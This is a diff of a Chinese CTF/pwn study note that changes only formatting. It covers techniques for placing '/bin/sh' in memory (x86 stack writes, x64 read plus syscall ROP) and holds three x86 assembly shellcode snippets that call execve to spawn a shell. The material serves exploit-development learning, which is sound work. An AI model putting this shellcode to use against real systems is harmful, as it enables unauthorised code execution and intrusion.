@@ -204,11 +204,13 @@ date: 2024-01-31
 
 ### 寫/bin/sh\x00的方法
 * [Shellcode Cheat Sheet](http://shell-storm.org/shellcode/index.html)
-1. 如果是x86版本: 建議直接寫在stack上，因為比較少int 0x80 ; ret的gadget可以用，那倒不如直接寫在script上然後計算esp或ebp的位置，一樣可以拿到儲存的位置
+
+1. 如果是x86版本: 建議直接寫在stack上，因為比較少`int 0x80 ; ret;`的gadget可以用，那倒不如直接寫在script上然後計算esp或ebp的位置，一樣可以拿到儲存的位置
 2. 如果是x64版本: 建議可以用system read的方式搭配syscall ret的ROP
 3. 如果是直接執行shell code且shell code是可以直接讓我們輸入的話就直接參考exploit db的就好了
+
 * eg 1
-    ```
+    ```asm
     push 0x0b
     pop eax
     push 0x0068732f
@@ -217,7 +219,7 @@ date: 2024-01-31
     int 0x80
     ```
 * eg 2
-    ```
+    ```asm
     mov eax, 0x6e69622f
     push eax
     mov eax, 0x0068732f
@@ -231,66 +233,66 @@ date: 2024-01-31
     int 0x80
     ```
 * eg 3
-    ```
+    ```asm
     /*Put the syscall number of execve in eax*/
-        xor eax, eax
-        mov al, 0xb
-        
-        /*Put zero in ecx and edx*/
-        xor ecx, ecx
-        xor edx, edx
-        
-        /*Push "/sh\x00" on the stack*/
-        xor ebx, ebx
-        mov bl, 0x68
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        mov bh, 0x73
-        mov bl, 0x2f
-        push ebx
-        nop
-        
-        /*Push "/bin" on the stack*/
-        mov bh, 0x6e
-        mov bl, 0x69
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        shl ebx
-        mov bh, 0x62
-        mov bl, 0x2f
-        push ebx
-        nop
-                
-        /*Move the esp (that points to "/bin/sh\x00") in ebx*/
-        mov ebx, esp/*Syscall*/
-        int 0x80
+    xor eax, eax
+    mov al, 0xb
+    
+    /*Put zero in ecx and edx*/
+    xor ecx, ecx
+    xor edx, edx
+    
+    /*Push "/sh\x00" on the stack*/
+    xor ebx, ebx
+    mov bl, 0x68
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    mov bh, 0x73
+    mov bl, 0x2f
+    push ebx
+    nop
+    
+    /*Push "/bin" on the stack*/
+    mov bh, 0x6e
+    mov bl, 0x69
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    shl ebx
+    mov bh, 0x62
+    mov bl, 0x2f
+    push ebx
+    nop
+            
+    /*Move the esp (that points to "/bin/sh\x00") in ebx*/
+    mov ebx, esp/*Syscall*/
+    int 0x80
     ```
 
 ### 如何讓環境執行在指定的libc和loader中
